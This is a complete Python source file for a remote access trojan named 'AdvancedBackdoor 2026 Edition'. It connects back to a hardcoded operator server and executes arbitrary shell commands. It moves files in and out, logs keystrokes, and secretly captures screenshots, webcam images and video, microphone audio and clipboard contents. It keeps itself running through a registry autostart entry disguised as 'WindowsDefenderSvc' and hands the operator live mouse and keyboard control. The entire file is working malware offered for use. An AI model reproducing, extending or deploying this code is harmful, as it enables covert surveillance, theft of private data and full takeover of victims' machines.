#!/usr/bin/env python3
"""
client.py - AdvancedBackdoor 2026 Edition
"""

import socket
import subprocess
import json
import os
import sys
import time
import base64
import io
import threading
import platform
from PIL import ImageGrab
import cv2
import pygetwindow as gw
import requests
from pynput.keyboard import Key, Listener

# ─── Encrypted channel (requires: pip install cryptography) ──────────────────
# This key must match the server. Change both if you rotate keys.
_SHARED_KEY = b'BackdoorKey2026!AdvancedSecurity'   # exactly 32 bytes
try:
    from cryptography.fernet import Fernet as _Fernet
    _cipher = _Fernet(base64.urlsafe_b64encode(_SHARED_KEY))
    ENCRYPTED = True
except ImportError:
    _cipher = None
    ENCRYPTED = False
# ─────────────────────────────────────────────────────────────────────────────


class AdvancedBackdoor:
    def __init__(self, host, port):
        self.server_ip = host
        self.server_port = port
        self.s = None
        self.keylog_buffer = []
        self.keylog_active = False
        self.keylog_listener = None
        self.connection()

    # ─── Protocol ─────────────────────────────────────────────────────────────

    def reliable_send(self, data):
        try:
            payload = json.dumps(data).encode()
            if ENCRYPTED and _cipher:
                # Wrap the Fernet token inside a JSON object so the recv
                # loop can still frame on valid JSON boundaries.
                token = _cipher.encrypt(payload)
                payload = json.dumps({"e": token.decode()}).encode()
            self.s.sendall(payload)
        except Exception as e:
            print(f"[-] Send error: {e}")

    def reliable_recv(self):
        buf = ""
        while True:
            try:
                chunk = self.s.recv(4096).decode("utf-8", errors="replace")
                buf += chunk
                if not chunk:
                    return None
                parsed = json.loads(buf)
                if ENCRYPTED and _cipher and isinstance(parsed, dict) and "e" in parsed:
                    clear = _cipher.decrypt(parsed["e"].encode())
                    return json.loads(clear.decode())
                return parsed
            except ValueError:
                continue
            except Exception as e:
                print(f"[-] Recv error: {e}")
                return None

    def connection(self):
        while True:
            try:
                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.s.connect((self.server_ip, self.server_port))
                print(f"[+] Connected to {self.server_ip}:{self.server_port}"
                      f"  (encrypted={ENCRYPTED})")
                self.shell()
            except (socket.error, ConnectionRefusedError) as e:
                print(f"[-] {e} — retrying in 10s...")
                time.sleep(10)
            except Exception as e:
                print(f"[-] Unexpected error: {e}")
                time.sleep(10)

    # ─── File transfer ────────────────────────────────────────────────────────

    def upload_file(self, file_name):
        try:
            with open(file_name, "rb") as f:
                data = f.read()
            self.reliable_send(
                f"[UPLOAD] File '{file_name}' uploaded ({len(data)} bytes)")
            self.s.sendall(base64.b64encode(data))
            time.sleep(0.5)
            self.s.sendall(b"<END>")
        except FileNotFoundError:
            self.reliable_send(f"[ERROR] File '{file_name}' not found locally")
        except Exception as e:
            self.reliable_send(f"[ERROR] Upload failed: {e}")

    def download_file(self, file_name):
        try:
            raw = b""
            while True:
                chunk = self.s.recv(4096)
                if b"<END>" in chunk:
                    raw += chunk.replace(b"<END>", b"")
                    break
                raw += chunk
            with open(file_name, "wb") as f:
                f.write(base64.b64decode(raw))
            self.reliable_send(
                f"[DOWNLOAD] File '{file_name}' saved ({len(raw)} bytes)")
        except Exception as e:
            self.reliable_send(f"[ERROR] Download failed: {e}")

    # ─── Capture ──────────────────────────────────────────────────────────────

    def capture_screenshot(self):
        try:
            img = ImageGrab.grab(all_screens=True)
            fname = f"screenshot_{int(time.time())}.png"
            img.save(fname)
            return fname
        except Exception as e:
            print(f"[-] Screenshot error: {e}")
            return None

    def capture_webcam(self):
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                return None
            time.sleep(0.5)
            ret, frame = cam.read()
            cam.release()
            if not ret:
                return None
            fname = f"webcam_{int(time.time())}.jpg"
            cv2.imwrite(fname, frame)
            return fname
        except Exception as e:
            print(f"[-] Webcam error: {e}")
            return None

    def capture_webcam_video(self, duration=10):
        try:
            cam = cv2.VideoCapture(0)
            if not cam.isOpened():
                return None
            fname = f"webcam_video_{int(time.time())}.avi"
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            w, h = int(cam.get(3)), int(cam.get(4))
            out = cv2.VideoWriter(fname, fourcc, 20.0, (w, h))
            t0 = time.time()
            while time.time() - t0 < duration:
                ret, frame = cam.read()
                if ret:
                    out.write(frame)
                else:
                    break
            cam.release()
            out.release()
            return fname
        except Exception as e:
            print(f"[-] Webcam video error: {e}")
            return None

    # ─── Keylogger ────────────────────────────────────────────────────────────

    def _on_key_press(self, key):
        try:
            if hasattr(key, "char") and key.char is not None:
                self.keylog_buffer.append(key.char)
            elif key == Key.space:
                self.keylog_buffer.append(" ")
            elif key == Key.enter:
                self.keylog_buffer.append("\n")
            elif key == Key.tab:
                self.keylog_buffer.append("\t")
            elif key == Key.backspace:
                if self.keylog_buffer:
                    self.keylog_buffer.pop()
            elif key in (Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_r):
                pass
            else:
                self.keylog_buffer.append(f"[{key.name}]")
        except Exception:
            self.keylog_buffer.append("[?]")

    def start_keylogger(self):
        if self.keylog_active:
            return "Keylogger already running"
        self.keylog_buffer = []
        self.keylog_active = True
        self.keylog_listener = Listener(on_press=self._on_key_press)
        self.keylog_listener.daemon = True
        self.keylog_listener.start()
        return "[+] Keylogger started"

    def stop_keylogger(self):
        if not self.keylog_active:
            return "Keylogger not running"
        self.keylog_active = False
        if self.keylog_listener:
            self.keylog_listener.stop()
            self.keylog_listener = None
        log = "".join(self.keylog_buffer)
        self.keylog_buffer = []
        return log if log else "[No keys captured]"

    def dump_keylog(self):
        log = "".join(self.keylog_buffer)
        self.keylog_buffer = []
        return log if log else "[No keys captured]"

    # ─── File ops ─────────────────────────────────────────────────────────────

    def delete_file(self, path):
        try:
            if os.path.isdir(path):
                import shutil
                shutil.rmtree(path)
                return f"[DELETE] Directory '{path}' removed"
            os.remove(path)
            return f"[DELETE] File '{path}' deleted"
        except FileNotFoundError:
            return f"[ERROR] '{path}' not found"
        except PermissionError:
            return f"[ERROR] Permission denied: '{path}'"
        except Exception as e:
            return f"[ERROR] {e}"

    # ─── System info ──────────────────────────────────────────────────────────

    def get_system_info(self):
        info = {
            "hostname":    platform.node(),
            "os":          platform.system(),
            "os_version":  platform.version(),
            "arch":        platform.machine(),
            "processor":   platform.processor(),
            "python":      platform.python_version(),
            "user":        os.environ.get("USERNAME") or os.environ.get("USER", "unknown"),
            "cwd":         os.getcwd(),
            "encrypted":   ENCRYPTED,
        }
        return json.dumps(info, indent=2)

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True,
                                    text=True, timeout=60)
            output = result.stdout + result.stderr
            return output if output else "[Command executed with no output]"
        except subprocess.TimeoutExpired:
            return "[ERROR] Command timed out (60s)"
        except Exception as e:
            return f"[ERROR] {e}"

    # ─── NEW: Process management ──────────────────────────────────────────────

    def list_processes(self):
        try:
            import psutil
            lines = [f"{'PID':>7}  {'NAME':<35} {'CPU%':>6}  {'MEM MB':>8}  STATUS"]
            lines.append("─" * 72)
            for proc in psutil.process_iter(
                    ["pid", "name", "cpu_percent", "memory_info", "status"]):
                try:
                    i = proc.info
                    mem = (i["memory_info"].rss / 1_048_576) if i.get("memory_info") else 0
                    lines.append(
                        f"{i['pid']:>7}  {(i['name'] or ''):<35}"
                        f" {i['cpu_percent']:>6.1f}  {mem:>8.1f}  {i.get('status','')}"
                    )
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return "\n".join(lines)
        except ImportError:
            return "[ERROR] psutil not installed — pip install psutil"
        except Exception as e:
            return f"[ERROR] {e}"

    def kill_process(self, pid):
        try:
            import psutil
            p = psutil.Process(int(pid))
            name = p.name()
            p.kill()
            return f"[+] Killed PID {pid} ({name})"
        except ImportError:
            return "[ERROR] psutil not installed"
        except psutil.NoSuchProcess:
            return f"[ERROR] No process with PID {pid}"
        except psutil.AccessDenied:
            return f"[ERROR] Access denied for PID {pid}"
        except Exception as e:
            return f"[ERROR] {e}"

    # ─── NEW: System monitor ──────────────────────────────────────────────────

    def system_monitor(self):
        try:
            import psutil
            cpu_cores = psutil.cpu_percent(interval=1, percpu=True)
            cpu_total = psutil.cpu_percent(interval=0)
            mem  = psutil.virtual_memory()
            disk = psutil.disk_usage(os.path.splitdrive(os.getcwd())[0] or "/")
            net  = psutil.net_io_counters()
            boot = time.strftime("%Y-%m-%d %H:%M:%S",
                                  time.localtime(psutil.boot_time()))
            cores_str = "  ".join(f"C{n}:{v:.0f}%" for n, v in enumerate(cpu_cores))
            return (
                "\n╔══════════════════ SYSTEM MONITOR ═══════════════════╗\n"
                f"  CPU Total  : {cpu_total:5.1f}%\n"
                f"  CPU Cores  : {cores_str}\n"
                f"  RAM        : {mem.used/1e9:.2f} GB / {mem.total/1e9:.2f} GB"
                f"  ({mem.percent:.1f}%)\n"
                f"  Disk       : {disk.used/1e9:.2f} GB / {disk.total/1e9:.2f} GB"
                f"  ({disk.percent:.1f}%)\n"
                f"  Net TX     : {net.bytes_sent/1e6:.2f} MB   "
                f"RX: {net.bytes_recv/1e6:.2f} MB\n"
                f"  Boot Time  : {boot}\n"
                "╚══════════════════════════════════════════════════════╝"
            )
        except ImportError:
            return "[ERROR] psutil not installed — pip install psutil"
        except Exception as e:
            return f"[ERROR] {e}"

    # ─── NEW: Clipboard ───────────────────────────────────────────────────────

    def get_clipboard(self):
        # Try PowerShell first (no extra dep), then pywin32
        try:
            r = subprocess.run(
                ["powershell", "-command", "Get-Clipboard"],
                capture_output=True, text=True, timeout=5
            )
            text = r.stdout.strip()
            return text if text else "[Clipboard is empty]"
        except Exception:
            pass
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return data
        except Exception as e:
            return f"[ERROR] Clipboard read failed: {e}"

    def set_clipboard(self, text):
        try:
            subprocess.run(
                ["powershell", "-command", f'Set-Clipboard -Value "{text}"'],
                capture_output=True, timeout=5
            )
            return f"[+] Clipboard set ({len(text)} chars)"
        except Exception:
            pass
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)
            win32clipboard.CloseClipboard()
            return f"[+] Clipboard set ({len(text)} chars)"
        except Exception as e:
            return f"[ERROR] Clipboard write failed: {e}"

    # ─── NEW: Audio recording ─────────────────────────────────────────────────

    def audio_record(self, duration=10):
        # Try sounddevice (pip install sounddevice scipy)
        try:
            import sounddevice as sd
            import scipy.io.wavfile as wavfile
            RATE = 44100
            recording = sd.rec(int(duration * RATE), samplerate=RATE,
                               channels=1, dtype="int16")
            sd.wait()
            fname = f"audio_{int(time.time())}.wav"
            wavfile.write(fname, RATE, recording)
            return fname
        except ImportError:
            pass
        # Fallback: pyaudio (pip install pyaudio)
        try:
            import pyaudio, wave
            CHUNK, RATE, CH = 1024, 44100, 1
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=CH,
                            rate=RATE, input=True, frames_per_buffer=CHUNK)
            frames = [stream.read(CHUNK)
                      for _ in range(int(RATE / CHUNK * duration))]
            stream.stop_stream()
            stream.close()
            p.terminate()
            fname = f"audio_{int(time.time())}.wav"
            with wave.open(fname, "wb") as wf:
                wf.setnchannels(CH)
                wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
                wf.setframerate(RATE)
                wf.writeframes(b"".join(frames))
            return fname
        except Exception as e:
            print(f"[-] Audio error: {e}")
            return None

    # ─── NEW: File search ─────────────────────────────────────────────────────

    def search_files(self, extension, directory=None):
        if not directory:
            directory = os.path.expanduser("~")
        _SKIP = {"Windows", "System32", "$Recycle.Bin", "node_modules",
                 "__pycache__", ".git", "Temp"}
        results = []
        try:
            for root, dirs, files in os.walk(directory, topdown=True):
                dirs[:] = [d for d in dirs if d not in _SKIP]
                for f in files:
                    if f.lower().endswith(extension.lower()):
                        full = os.path.join(root, f)
                        try:
                            sz = os.path.getsize(full)
                            results.append(f"  {full}  ({sz:,}B)")
                        except OSError:
                            results.append(f"  {full}")
                        if len(results) >= 200:
                            break
                if len(results) >= 200:
                    break
            if results:
                return (f"[+] Found {len(results)} *{extension} files in"
                        f" '{directory}':\n" + "\n".join(results))
            return f"[-] No *{extension} files found in '{directory}'"
        except Exception as e:
            return f"[ERROR] {e}"

    # ─── NEW: Persistence ─────────────────────────────────────────────────────

    def add_persistence(self):
        try:
            import winreg
            run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0,
                                  winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsDefenderSvc", 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
            return "[+] Persistence added: HKCU\\Run\\WindowsDefenderSvc"
        except Exception as e:
            return f"[-] Persistence failed: {e}"

    def remove_persistence(self):
        try:
            import winreg
            run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0,
                                  winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsDefenderSvc")
            winreg.CloseKey(key)
            return "[+] Persistence entry removed"
        except FileNotFoundError:
            return "[-] Persistence key not found"
        except Exception as e:
            return f"[-] Remove failed: {e}"

    # ─── NEW: Network ─────────────────────────────────────────────────────────

    def get_netstat(self):
        try:
            import psutil
            lines = [
                f"{'PROTO':<6} {'LOCAL':<26} {'REMOTE':<26} {'STATUS':<14} PID"
            ]
            lines.append("─" * 82)
            for c in psutil.net_connections(kind="inet"):
                proto = "TCP" if c.type == socket.SOCK_STREAM else "UDP"
                la = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else "-"
                ra = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "-"
                lines.append(
                    f"{proto:<6} {la:<26} {ra:<26} {c.status:<14} {c.pid or '-'}"
                )
            return "\n".join(lines)
        except ImportError:
            return "[ERROR] psutil not installed"
        except Exception as e:
            return f"[ERROR] {e}"

    def get_env(self):
        return "\n".join(f"  {k}={v}" for k, v in sorted(os.environ.items()))

    def get_active_window(self):
        try:
            win = gw.getActiveWindow()
            if win:
                return (f"[+] Active window: '{win.title}'"
                        f"  pos=({win.left},{win.top})"
                        f"  size={win.width}x{win.height}")
            return "[-] No active window detected"
        except Exception as e:
            return f"[ERROR] {e}"

    # ─── NEW: Screen stream ───────────────────────────────────────────────────

    def screen_stream(self, count=5, interval=1.5):
        """Capture and push `count` screenshots to server, `interval` sec apart."""
        for i in range(count):
            fname = self.capture_screenshot()
            if fname:
                self.reliable_send(f"[STREAM] Frame {i + 1}/{count}")
                self.upload_file(fname)
                try:
                    os.remove(fname)
                except Exception:
                    pass
            else:
                self.reliable_send(f"[STREAM] Frame {i + 1}/{count} — capture failed")
            if i < count - 1:
                time.sleep(interval)
        self.reliable_send("[STREAM_END]")

    # ─── NEW: Real-time remote desktop (AnyDesk-style) ────────────────────────

    def remote_desktop_mode(self, quality=30, fps=15):
        """
        Full-duplex streaming mode.
        Client → Server : [4-byte big-endian length][JPEG bytes]  (continuous)
        Server → Client : {"type":"…", …}\n                       (control events)
        Exit condition  : server sends {"type":"stop"}\n
                          client sends 4 zero bytes as end-of-stream marker
        """
        try:
            import pyautogui
            pyautogui.FAILSAFE = False
            pyautogui.PAUSE = 0
        except ImportError:
            print("[-] pyautogui not installed — remote control disabled")

        self._rd_active = True
        self._rd_quality = quality
        self._rd_fps = fps

        # Background thread: receive and execute control events from server
        def _ctrl_loop():
            buf = b""
            while self._rd_active:
                try:
                    chunk = self.s.recv(4096)
                    if not chunk:
                        self._rd_active = False
                        break
                    buf += chunk
                    while b"\n" in buf:
                        line, buf = buf.split(b"\n", 1)
                        line = line.strip()
                        if line:
                            try:
                                evt = json.loads(line.decode())
                                if evt.get("type") == "stop":
                                    self._rd_active = False
                                    return
                                self._apply_control(evt)
                            except Exception:
                                pass
                except Exception:
                    self._rd_active = False
                    break

        threading.Thread(target=_ctrl_loop, daemon=True).start()

        # Main: capture screen and stream JPEG frames
        while self._rd_active:
            t0 = time.time()
            try:
                img = ImageGrab.grab(all_screens=True)
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=self._rd_quality)
                frame = buf.getvalue()
                self.s.sendall(len(frame).to_bytes(4, "big") + frame)
            except Exception as e:
                if self._rd_active:
                    print(f"[-] RD frame error: {e}")
                self._rd_active = False
                break

            interval = 1.0 / max(self._rd_fps, 1)
            rem = interval - (time.time() - t0)
            if rem > 0:
                time.sleep(rem)

        # Zero-length frame = end-of-stream signal to server
        try:
            self.s.sendall(b"\x00\x00\x00\x00")
        except Exception:
            pass

    def _apply_control(self, evt):
        """Execute a single mouse/keyboard control event from the server."""
        try:
            import pyautogui
            t = evt.get("type", "")
            x, y = evt.get("x", 0), evt.get("y", 0)

            if t == "settings":
                self._rd_quality = max(5, min(95, evt.get("quality", self._rd_quality)))
                self._rd_fps    = max(1, min(30, evt.get("fps",     self._rd_fps)))
            elif t == "mouse_move":
                pyautogui.moveTo(x, y)
            elif t == "mouse_click":
                pyautogui.click(x, y, button=evt.get("btn", "left"))
            elif t == "mouse_double":
                pyautogui.doubleClick(x, y)
            elif t == "mouse_right":
                pyautogui.rightClick(x, y)
            elif t == "mouse_scroll":
                pyautogui.scroll(evt.get("delta", 0), x=x, y=y)
            elif t == "key_press":
                key = evt.get("key", "")
                if key:
                    pyautogui.press(key)
            elif t == "key_type":
                text = evt.get("text", "")
                if text:
                    pyautogui.write(text, interval=0)
        except Exception:
            pass

    # ─── Shell ────────────────────────────────────────────────────────────────

    def shell(self):  # noqa: C901
        while True:
            command = self.reliable_recv()
            if command is None:
                break

            if command == "quit":
                self.reliable_send("[*] Closing connection...")
                break

            elif command == "clear":
                os.system("cls" if os.name == "nt" else "clear")

            elif command.startswith("cd "):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    self.reliable_send(f"[+] cwd: {os.getcwd()}")
                except Exception as e:
                    self.reliable_send(f"[-] cd error: {e}")

            # ── file transfer ─────────────────────────────────────────────────
            elif command.startswith("download "):
                self.upload_file(command[9:].strip())

            elif command.startswith("upload "):
                fname = command[7:].strip()
                self.reliable_send(f"[*] Ready to receive '{fname}'")
                self.download_file(fname)

            # ── capture ───────────────────────────────────────────────────────
            elif command == "screenshot":
                fname = self.capture_screenshot()
                if fname:
                    self.reliable_send(f"[+] Screenshot '{fname}', uploading...")
                    self.upload_file(fname)
                    try: os.remove(fname)
                    except Exception: pass
                else:
                    self.reliable_send("[-] Screenshot failed")

            elif command == "webcam":
                fname = self.capture_webcam()
                if fname:
                    self.reliable_send(f"[+] Webcam '{fname}', uploading...")
                    self.upload_file(fname)
                    try: os.remove(fname)
                    except Exception: pass
                else:
                    self.reliable_send("[-] Webcam failed (no camera?)")

            elif command.startswith("webcam_video"):
                parts = command.split()
                dur = 10
                if len(parts) > 1:
                    try: dur = int(parts[1])
                    except Exception: pass
                self.reliable_send(f"[*] Recording {dur}s...")
                fname = self.capture_webcam_video(dur)
                if fname:
                    self.reliable_send(f"[+] Video '{fname}', uploading...")
                    self.upload_file(fname)
                    try: os.remove(fname)
                    except Exception: pass
                else:
                    self.reliable_send("[-] Webcam video failed")

            # ── keylogger ─────────────────────────────────────────────────────
            elif command == "keylog_start":
                self.reliable_send(self.start_keylogger())
            elif command == "keylog_stop":
                self.reliable_send(self.stop_keylogger())
            elif command == "keylog_dump":
                self.reliable_send(self.dump_keylog())

            # ── file ops ──────────────────────────────────────────────────────
            elif command.startswith("delete "):
                self.reliable_send(self.delete_file(command[7:].strip()))

            # ── system ────────────────────────────────────────────────────────
            elif command == "sysinfo":
                self.reliable_send(self.get_system_info())

            # ── NEW: process management ───────────────────────────────────────
            elif command == "ps":
                self.reliable_send(self.list_processes())

            elif command.startswith("kill "):
                self.reliable_send(self.kill_process(command[5:].strip()))

            # ── NEW: monitoring ───────────────────────────────────────────────
            elif command == "sysmon":
                self.reliable_send(self.system_monitor())

            # ── NEW: clipboard ────────────────────────────────────────────────
            elif command == "clipboard":
                self.reliable_send(self.get_clipboard())

            elif command.startswith("clipboard_set "):
                self.reliable_send(self.set_clipboard(command[14:].strip()))

            # ── NEW: audio ────────────────────────────────────────────────────
            elif command.startswith("audio_record"):
                parts = command.split()
                dur = 10
                if len(parts) > 1:
                    try: dur = int(parts[1])
                    except Exception: pass
                self.reliable_send(f"[*] Recording audio for {dur}s...")
                fname = self.audio_record(dur)
                if fname:
                    self.reliable_send(f"[+] Audio '{fname}', uploading...")
                    self.upload_file(fname)
                    try: os.remove(fname)
                    except Exception: pass
                else:
                    self.reliable_send("[-] Audio failed (no mic or missing dep)")

            # ── NEW: file search ──────────────────────────────────────────────
            elif command.startswith("filesearch "):
                parts = command[11:].strip().split(None, 1)
                ext = parts[0] if parts else ".txt"
                directory = parts[1] if len(parts) > 1 else None
                self.reliable_send(self.search_files(ext, directory))

            # ── NEW: persistence ──────────────────────────────────────────────
            elif command == "persistence_add":
                self.reliable_send(self.add_persistence())

            elif command == "persistence_remove":
                self.reliable_send(self.remove_persistence())

            # ── NEW: network / env ────────────────────────────────────────────
            elif command == "netstat":
                self.reliable_send(self.get_netstat())

            elif command == "env":
                self.reliable_send(self.get_env())

            elif command == "active_window":
                self.reliable_send(self.get_active_window())

            # ── NEW: screen stream ────────────────────────────────────────────
            elif command.startswith("screen_stream"):
                parts = command.split()
                count = 5
                if len(parts) > 1:
                    try: count = int(parts[1])
                    except Exception: pass
                self.reliable_send(f"[*] Starting screen stream ({count} frames)...")
                self.screen_stream(count)

            # ── NEW: real-time remote desktop ─────────────────────────────────
            elif command == "remote_desktop":
                # Respond with fixed 4-byte handshake marker (NOT encrypted JSON)
                # so the server can cleanly switch to binary framing mode.
                self.s.sendall(b"RDST")
                self.remote_desktop_mode()

            # ── help ──────────────────────────────────────────────────────────
            elif command == "help":
                self.reliable_send(_HELP_TEXT)

            # ── generic shell command ─────────────────────────────────────────
            else:
                self.reliable_send(self.execute_command(command))

        self.s.close()


_HELP_TEXT = f"""
╔══════════════ AdvancedBackdoor 2026 — Command Reference ══════════════╗

SYSTEM
  sysinfo                     Full system info (OS, CPU, user, cwd)
  sysmon                      Live CPU / RAM / Disk / Network stats
  env                         Dump all environment variables
  active_window               Currently focused window title + position

PROCESS
  ps                          List all running processes (PID, CPU, MEM)
  kill <pid>                  Terminate process by PID

SHELL
  <command>                   Execute any shell command (60s timeout)
  cd <path>                   Change working directory

FILE
  download <file>             Pull file from client → server
  upload <file>               Push file from server → client
  delete <file|dir>           Delete file or directory
  filesearch <ext> [dir]      Find files by extension under [dir]
                              e.g.  filesearch .docx  C:\\Users

CAPTURE
  screenshot                  Screenshot all monitors (PNG)
  screen_stream [n]           Stream n screenshots (default 5, ~1.5s apart)
  remote_desktop              Live screen view + full mouse/keyboard control
  webcam                      Single webcam frame (JPG)
  webcam_video [sec]          Record webcam video (default 10s, AVI)
  audio_record [sec]          Record microphone (default 10s, WAV)

SURVEILLANCE
  keylog_start                Start keystroke logger (background)
  keylog_stop                 Stop logger and return buffered keys
  keylog_dump                 Flush key buffer without stopping

CLIPBOARD
  clipboard                   Read clipboard contents
  clipboard_set <text>        Overwrite clipboard with <text>

PERSISTENCE
  persistence_add             Add HKCU\\Run autostart entry
  persistence_remove          Remove autostart entry

NETWORK
  netstat                     Show active TCP/UDP connections

MISC
  quit                        Close this session
  help                        Show this help

  Encryption: {"ON  (Fernet AES-128-CBC + HMAC-SHA256)" if ENCRYPTED else "OFF (install cryptography: pip install cryptography)"}
╚═══════════════════════════════════════════════════════════════════════╝
"""


if __name__ == "__main__":
    BACKDOOR_HOST = "192.168.0.102"   # ← your server IP
    BACKDOOR_PORT = 5555
    AdvancedBackdoor(BACKDOOR_HOST, BACKDOOR_PORT)